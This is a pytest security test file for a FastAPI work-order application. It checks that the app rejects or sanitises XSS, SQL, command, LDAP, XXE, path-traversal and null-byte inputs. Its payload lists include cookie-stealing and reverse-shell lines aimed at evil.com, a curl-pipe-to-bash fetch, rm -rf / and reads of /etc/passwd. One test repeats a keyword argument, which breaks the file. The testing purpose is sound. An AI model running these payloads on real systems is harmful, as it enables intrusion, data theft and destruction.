#!/usr/bin/env python3
"""
Input Validation Security Tests
Tests for XSS, SQL injection, and other input validation vulnerabilities
"""

import os
import sys
import pytest
from pathlib import Path
from fastapi.testclient import TestClient
from typing import List, Dict, Any
import json
import html
import urllib.parse
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from app.main import app
from app.database import get_db, Base, engine
from app.models.user_models import User
from app.models import WorkOrder
from app.auth.security import create_access_token, get_password_hash

# Test client
client = TestClient(app)

# Common XSS payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg onload=alert("XSS")>',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')">',
    '<body onload=alert("XSS")>',
    '${alert("XSS")}',
    '<script>fetch("http://evil.com/steal?cookie="+document.cookie)</script>',
    '<!--<script>alert("XSS")</script>-->',
    '<style>@import"http://evil.com/xss.css";</style>',
    '<meta http-equiv="refresh" content="0;url=http://evil.com">',
    '<base href="http://evil.com/">',
    '<object data="http://evil.com/xss.swf">',
    '<embed src="http://evil.com/xss.swf">',
    '<form action="http://evil.com/steal"><input name="data" value="',
    '" onfocus="alert(\'XSS\')" autofocus="',
    '<input type="text" value="&#x22;&#x3e;&#x3c;script&#x3e;alert(&#x27;XSS&#x27;)&#x3c;/script&#x3e;">',
    '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click</a>',
]

# SQL injection payloads
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1' AND '1'='1",
    "1' OR '1'='1' --",
    "admin'--",
    "' OR 1=1--",
    "'; DELETE FROM work_orders; --",
    "' UNION SELECT username, password FROM users--",
    "1'; UPDATE users SET is_admin=true WHERE username='attacker'--",
    "' AND 1=0 UNION SELECT NULL, table_name FROM information_schema.tables--",
    "\\'; DROP TABLE users; --",
    "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND '1'='1",
    "'; EXEC xp_cmdshell('net user hacker password /add'); --",
    "' WAITFOR DELAY '00:00:05'--",
    "' OR pg_sleep(5)--",
    "' OR SLEEP(5)--",
    "${1+1}",
    "{{7*7}}",
    "%27%20OR%20%271%27%3D%271",
]

# Command injection payloads
COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "& net user",
    "`id`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| curl http://evil.com/shell.sh | bash",
    "; rm -rf /",
    "'; exec master..xp_cmdshell 'dir'--",
    "\"; system('ls'); //",
    "'; echo vulnerable >&2; '",
    "| nc -e /bin/sh evil.com 4444",
    "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
]

# Path traversal payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/var/www/../../etc/passwd",
    "C:\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "\\\\server\\share\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
    "file:///etc/passwd",
    "....\\\\....\\\\....\\\\windows\\\\win.ini",
]

# LDAP injection payloads
LDAP_INJECTION_PAYLOADS = [
    "*",
    "*)(&(objectClass=*",
    "*)(mail=*",
    "*)(|(mail=*",
    "admin)(&(password=*",
    "admin)(!(&(1=0",
    "*)(uid=*))(|(uid=*",
]

# XXE payloads
XXE_PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]><root>&test;</root>',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
]


class TestInputValidation:
    """Test cases for input validation security"""
    
    @classmethod
    def setup_class(cls):
        """Setup test environment"""
        os.environ["SECRET_KEY"] = "test_secret_key_for_input_validation"
        os.environ["FOSSAWORK_MASTER_KEY"] = "test_master_key"
        
        # Create test database
        Base.metadata.create_all(bind=engine)
        
        # Create test user
        db = next(get_db())
        try:
            user = User(
                id="input_test_user",
                username="inputtest@example.com",
                email="inputtest@example.com",
                hashed_password=get_password_hash("TestPassword123!"),
                is_active=True
            )
            db.add(user)
            
            # Create a test work order
            wo = WorkOrder(
                id="wo_input_test",
                work_order_id="W-9999",
                user_id="input_test_user",
                store_number="9999",
                customer_name="Test Customer",
                address="123 Test Street",
                service_code="2861",
                created_at=datetime.utcnow()
            )
            db.add(wo)
            
            db.commit()
        finally:
            db.close()
    
    @classmethod
    def teardown_class(cls):
        """Cleanup test environment"""
        Base.metadata.drop_all(bind=engine)
        if "SECRET_KEY" in os.environ:
            del os.environ["SECRET_KEY"]
        if "FOSSAWORK_MASTER_KEY" in os.environ:
            del os.environ["FOSSAWORK_MASTER_KEY"]
    
    def get_auth_headers(self) -> Dict[str, str]:
        """Get authentication headers"""
        response = client.post(
            "/api/auth/login",
            json={"username": "inputtest@example.com", "password": "TestPassword123!"}
        )
        assert response.status_code == 200
        token = response.json()["access_token"]
        return {"Authorization": f"Bearer {token}"}
    
    def test_xss_in_login_endpoint(self):
        """Test XSS protection in login endpoint"""
        for payload in XSS_PAYLOADS[:10]:  # Test first 10 payloads
            response = client.post(
                "/api/auth/login",
                json={"username": payload, "password": "password"}
            )
            
            # Should reject or sanitize, not reflect payload
            response_text = response.text
            assert payload not in response_text, f"XSS payload reflected: {payload}"
            assert html.escape(payload) not in response_text or payload != html.escape(payload), \
                f"Unescaped XSS payload in response: {payload}"
    
    def test_xss_in_work_order_creation(self):
        """Test XSS protection when creating work orders"""
        auth_headers = self.get_auth_headers()
        
        for payload in XSS_PAYLOADS[:5]:
            # Try XSS in various fields
            test_data = {
                "work_order_id": f"W-{payload}",
                "store_number": "1234",
                "customer_name": payload,
                "address": payload,
                "service_code": "2861",
                "instructions": payload
            }
            
            response = client.post(
                "/api/v1/work-orders",
                headers=auth_headers,
                json=test_data
            )
            
            # If accepted, verify it's sanitized when retrieved
            if response.status_code == 200:
                wo_id = response.json()["data"]["id"]
                
                # Retrieve and check
                get_response = client.get(
                    f"/api/v1/work-orders/{wo_id}",
                    headers=auth_headers
                )
                
                if get_response.status_code == 200:
                    data = get_response.json()["data"]
                    # Check that XSS payloads are escaped or sanitized
                    for field in ["customer_name", "address", "instructions"]:
                        if field in data and data[field]:
                            assert payload not in data[field] or \
                                   html.escape(payload) == data[field], \
                                f"Unescaped XSS in {field}: {data[field]}"
    
    def test_sql_injection_in_search_parameters(self):
        """Test SQL injection protection in search/filter parameters"""
        auth_headers = self.get_auth_headers()
        
        for payload in SQL_INJECTION_PAYLOADS[:10]:
            # Try SQL injection in various query parameters
            test_endpoints = [
                f"/api/v1/work-orders?store_number={payload}",
                f"/api/v1/work-orders?customer_name={payload}",
                f"/api/v1/work-orders?service_code={payload}",
                f"/api/v1/work-orders?search={payload}",
                f"/api/dispensers/{payload}",
            ]
            
            for endpoint in test_endpoints:
                response = client.get(endpoint, headers=auth_headers)
                
                # Should not return 500 (SQL error) or expose SQL error messages
                assert response.status_code != 500, \
                    f"Possible SQL injection vulnerability at {endpoint}"
                
                if response.status_code == 400:
                    # Check error message doesn't expose SQL details
                    error_msg = response.text.lower()
                    sql_keywords = ["select", "from", "where", "union", "insert", "update", "delete"]
                    for keyword in sql_keywords:
                        assert keyword not in error_msg, \
                            f"SQL keyword '{keyword}' exposed in error for {endpoint}"
    
    def test_sql_injection_in_path_parameters(self):
        """Test SQL injection in path parameters"""
        auth_headers = self.get_auth_headers()
        
        for payload in SQL_INJECTION_PAYLOADS[:5]:
            # URL encode the payload for path usage
            encoded_payload = urllib.parse.quote(payload, safe='')
            
            test_endpoints = [
                f"/api/v1/work-orders/{encoded_payload}",
                f"/api/dispensers/{encoded_payload}",
            ]
            
            for endpoint in test_endpoints:
                response = client.get(endpoint, headers=auth_headers)
                
                # Should return 404 or 422, not 500 or success
                assert response.status_code in [404, 422], \
                    f"Unexpected response for SQL injection at {endpoint}: {response.status_code}"
    
    def test_command_injection_protection(self):
        """Test command injection protection"""
        auth_headers = self.get_auth_headers()
        
        for payload in COMMAND_INJECTION_PAYLOADS[:5]:
            # Try command injection in fields that might execute commands
            test_data = {
                "filename": payload,
                "path": payload,
                "command": payload,
                "filter": payload,
                "export_format": payload
            }
            
            # Test various endpoints that might process these fields
            endpoints = [
                ("/api/v1/logs/download", "GET"),
                ("/api/settings", "POST"),
                ("/api/automation/export", "POST"),
            ]
            
            for endpoint, method in endpoints:
                if method == "GET":
                    response = client.get(
                        f"{endpoint}?file={payload}",
                        headers=auth_headers
                    )
                else:
                    response = client.post(
                        endpoint,
                        headers=auth_headers,
                        json=test_data
                    )
                
                # Should not execute commands
                assert response.status_code != 500, \
                    f"Possible command injection at {endpoint}"
                
                # Response should not contain command output
                if response.status_code == 200:
                    response_text = response.text
                    assert "root:" not in response_text, \
                        f"Possible /etc/passwd exposure at {endpoint}"
                    assert "uid=" not in response_text, \
                        f"Possible command execution at {endpoint}"
    
    def test_path_traversal_protection(self):
        """Test path traversal protection"""
        auth_headers = self.get_auth_headers()
        
        for payload in PATH_TRAVERSAL_PAYLOADS[:5]:
            # Try path traversal in file-related endpoints
            test_endpoints = [
                f"/api/v1/logs/download?file={payload}",
                f"/api/settings/export?path={payload}",
                f"/api/automation/upload?file={payload}",
            ]
            
            for endpoint in test_endpoints:
                response = client.get(endpoint, headers=auth_headers)
                
                # Should not allow access to system files
                if response.status_code == 200:
                    content = response.text
                    # Check for common system file contents
                    assert "root:x:" not in content, \
                        f"Possible /etc/passwd access at {endpoint}"
                    assert "[boot loader]" not in content, \
                        f"Possible win.ini access at {endpoint}"
                    assert "localhost" not in content or endpoint.endswith("hosts"), \
                        f"Possible hosts file access at {endpoint}"
    
    def test_json_injection_protection(self):
        """Test JSON injection and parser attacks"""
        auth_headers = self.get_auth_headers()
        
        # Malformed JSON payloads
        json_payloads = [
            '{"test": "value"',  # Missing closing brace
            '{"test": "value"}}',  # Extra closing brace
            '{"__proto__": {"isAdmin": true}}',  # Prototype pollution
            '{"constructor": {"prototype": {"isAdmin": true}}}',  # Constructor attack
            '{"test": "' + 'A' * 1000000 + '"}',  # Large string
            '{"a": {"b": {"c": {"d": {"e": {}}}}}}',  # Deep nesting
        ]
        
        for payload in json_payloads:
            try:
                response = client.post(
                    "/api/v1/work-orders",
                    headers=auth_headers,
                    data=payload,
                    headers={**auth_headers, "Content-Type": "application/json"}
                )
                
                # Should handle gracefully
                assert response.status_code in [400, 422], \
                    f"Didn't properly reject malformed JSON: {response.status_code}"
                
            except Exception as e:
                # Should not crash the client
                assert False, f"JSON payload caused exception: {e}"
    
    def test_xml_external_entity_protection(self):
        """Test XXE (XML External Entity) protection"""
        auth_headers = self.get_auth_headers()
        
        for payload in XXE_PAYLOADS:
            # Try XXE in endpoints that might process XML
            response = client.post(
                "/api/automation/import",
                headers={**auth_headers, "Content-Type": "application/xml"},
                data=payload
            )
            
            # Should reject or not process external entities
            if response.status_code == 200:
                content = response.text
                assert "root:x:" not in content, "XXE allowed file access"
                assert "admin:" not in content, "XXE exposed sensitive data"
    
    def test_integer_overflow_protection(self):
        """Test integer overflow protection"""
        auth_headers = self.get_auth_headers()
        
        # Integer overflow attempts
        overflow_values = [
            2**31,  # Max 32-bit signed int + 1
            2**63,  # Max 64-bit signed int + 1
            -2**31 - 1,  # Min 32-bit signed int - 1
            -2**63 - 1,  # Min 64-bit signed int - 1
            999999999999999999999,  # Very large number
            -999999999999999999999,  # Very small number
        ]
        
        for value in overflow_values:
            # Try in numeric fields
            response = client.get(
                f"/api/v1/work-orders?limit={value}",
                headers=auth_headers
            )
            
            # Should handle gracefully
            assert response.status_code in [400, 422], \
                f"Didn't handle integer overflow: {response.status_code}"
    
    def test_null_byte_injection(self):
        """Test null byte injection protection"""
        auth_headers = self.get_auth_headers()
        
        # Null byte payloads
        null_payloads = [
            "test\x00.txt",
            "test%00.txt",
            "test\0script",
            "test%2500.txt",
        ]
        
        for payload in null_payloads:
            response = client.get(
                f"/api/v1/logs/download?file={payload}",
                headers=auth_headers
            )
            
            # Should reject null bytes
            assert response.status_code in [400, 404, 422], \
                f"Didn't reject null byte injection: {response.status_code}"
    
    def test_unicode_bypass_attempts(self):
        """Test Unicode encoding bypass attempts"""
        auth_headers = self.get_auth_headers()
        
        # Unicode bypass attempts
        unicode_payloads = [
            "\u003cscript\u003ealert('XSS')\u003c/script\u003e",  # Unicode encoded
            "＜script＞alert('XSS')＜/script＞",  # Full-width characters
            "\\u003cscript\\u003ealert('XSS')\\u003c/script\\u003e",  # Escaped Unicode
            "%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e",  # URL encoded full-width
        ]
        
        for payload in unicode_payloads:
            response = client.post(
                "/api/v1/work-orders",
                headers=auth_headers,
                json={
                    "customer_name": payload,
                    "work_order_id": "W-1234",
                    "store_number": "1234",
                    "address": "Test",
                    "service_code": "2861"
                }
            )
            
            # If accepted, verify it's sanitized
            if response.status_code == 200:
                wo_id = response.json()["data"]["id"]
                get_response = client.get(
                    f"/api/v1/work-orders/{wo_id}",
                    headers=auth_headers
                )
                
                if get_response.status_code == 200:
                    data = get_response.json()["data"]
                    # Should not contain script tags in any form
                    customer_name = data.get("customer_name", "").lower()
                    assert "script" not in customer_name or \
                           "<" not in customer_name, \
                        f"Unicode bypass allowed XSS: {customer_name}"
    
    def test_input_length_limits(self):
        """Test that input length limits are enforced"""
        auth_headers = self.get_auth_headers()
        
        # Very long inputs
        long_string = "A" * 10000
        very_long_string = "B" * 1000000
        
        # Test various fields
        test_cases = [
            {"field": "customer_name", "value": long_string},
            {"field": "address", "value": very_long_string},
            {"field": "instructions", "value": very_long_string},
            {"field": "work_order_id", "value": "W-" + "9" * 1000},
        ]
        
        for test in test_cases:
            response = client.post(
                "/api/v1/work-orders",
                headers=auth_headers,
                json={
                    "work_order_id": "W-1234",
                    "store_number": "1234",
                    "customer_name": "Test",
                    "address": "Test Address",
                    "service_code": "2861",
                    test["field"]: test["value"]
                }
            )
            
            # Should enforce length limits
            if len(test["value"]) > 1000:
                assert response.status_code in [400, 422], \
                    f"No length limit on {test['field']}: {response.status_code}"
    
    def test_special_characters_handling(self):
        """Test handling of special characters"""
        auth_headers = self.get_auth_headers()
        
        # Special characters that might cause issues
        special_chars = [
            "Test & Company",
            "Test < > Company",
            "Test \" Quote",
            "Test ' Apostrophe",
            "Test \\ Backslash",
            "Test | Pipe",
            "Test ; Semicolon",
            "Test ` Backtick",
            "Test $ Dollar",
            "Test { } Braces",
            "Test [ ] Brackets",
            "Test ( ) Parens",
            "Test \n Newline",
            "Test \r Carriage",
            "Test \t Tab",
        ]
        
        for char_test in special_chars:
            response = client.post(
                "/api/v1/work-orders",
                headers=auth_headers,
                json={
                    "work_order_id": "W-1234",
                    "store_number": "1234", 
                    "customer_name": char_test,
                    "address": "Test Address",
                    "service_code": "2861"
                }
            )
            
            # Should handle special characters safely
            if response.status_code == 200:
                wo_id = response.json()["data"]["id"]
                
                # Verify it's stored and retrieved correctly
                get_response = client.get(
                    f"/api/v1/work-orders/{wo_id}",
                    headers=auth_headers
                )
                
                if get_response.status_code == 200:
                    data = get_response.json()["data"]
                    # Should preserve the special character safely
                    assert "customer_name" in data, "Customer name missing"
                    # But should be properly encoded if needed
                    if "&" in char_test:
                        # Could be HTML encoded
                        assert char_test == data["customer_name"] or \
                               html.escape(char_test) == data["customer_name"], \
                            "Special character not handled properly"


if __name__ == "__main__":
    # Run tests
    test = TestInputValidation()
    test.setup_class()
    
    try:
        print("Running input validation security tests...")
        
        test.test_xss_in_login_endpoint()
        print("✓ XSS protection in login endpoint")
        
        test.test_xss_in_work_order_creation()
        print("✓ XSS protection in work order creation")
        
        test.test_sql_injection_in_search_parameters()
        print("✓ SQL injection protection in search parameters")
        
        test.test_sql_injection_in_path_parameters()
        print("✓ SQL injection protection in path parameters")
        
        test.test_command_injection_protection()
        print("✓ Command injection protection")
        
        test.test_path_traversal_protection()
        print("✓ Path traversal protection")
        
        test.test_json_injection_protection()
        print("✓ JSON injection protection")
        
        test.test_xml_external_entity_protection()
        print("✓ XXE protection")
        
        test.test_integer_overflow_protection()
        print("✓ Integer overflow protection")
        
        test.test_null_byte_injection()
        print("✓ Null byte injection protection")
        
        test.test_unicode_bypass_attempts()
        print("✓ Unicode bypass protection")
        
        test.test_input_length_limits()
        print("✓ Input length limits enforced")
        
        test.test_special_characters_handling()
        print("✓ Special characters handled safely")
        
        print("\nAll input validation tests passed! ✓")
        
    finally:
        test.teardown_class()